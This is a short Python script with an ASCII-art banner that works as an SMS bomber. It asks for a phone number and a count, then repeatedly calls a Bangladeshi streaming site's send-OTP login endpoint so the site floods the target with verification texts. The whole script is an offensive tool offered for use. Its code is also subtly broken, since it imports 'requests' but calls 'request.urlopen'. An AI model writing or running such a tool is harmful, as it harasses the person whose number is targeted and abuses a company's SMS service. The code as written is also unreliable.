import os
import time
import requests
os.system('clear')

print ("""                                                                               
                                           _     _   _____    _         _____  
                                          (_)   (_) (_____)  (_)       (_____) 
                                          (__)_ (_)(_)   (_) (_)      (_)___(_)
                                          (_)(_)(_)(_)   (_) (_)      (_______)
                                          (_)  (__)(_)___(_) (_)____  (_)   (_)
                                          (_)   (_) (_____)  (______) (_)   (_)
                                                                               
                                                                               
                                                                                     	
                                                                                
""")

phone  = input("phone number: ")
sms = int(input("amount: "))

url ="https://www.bioscopelive.com/bn/login/send-otp?phone=88"+phone+"&operator=bd-otp"

for a in range(sms):
	request.urlopen(url)
	print(str(a+1)+ "sms send ")
	time.sleep(30)
